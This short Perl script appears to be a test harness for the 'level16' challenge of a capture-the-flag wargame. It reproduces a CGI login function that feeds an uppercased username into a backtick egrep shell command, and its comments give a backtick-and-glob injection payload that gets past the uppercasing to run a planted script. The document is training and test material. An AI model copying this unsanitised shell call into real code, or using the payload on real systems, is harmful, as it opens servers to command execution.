#!/usr/bin/perl
# Test level16 code execution of script stored in /home/level16: /*/*/MYSCRIPT
# Will trigger code execution with:
# ./exec.pl "`/*/*/MYSCRIPT`%00"
# or test locally: 
# username="`/*/*/MYSCRIPT`%00"&password=pass /home/flag16/index.cgi

sub login {
	$username = $_[0];
	$password = $_[1];

	$username =~ tr/a-z/A-Z/;	# conver to uppercase
	$username =~ s/\s.*//;		# strip everything after a space

	@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
	foreach $line (@output) {
		($usr, $pw) = split(/:/, $line);


		if($pw =~ $password) { 
			return 1;
		}
	}

	return 0;
}

login($ARGV[0]);
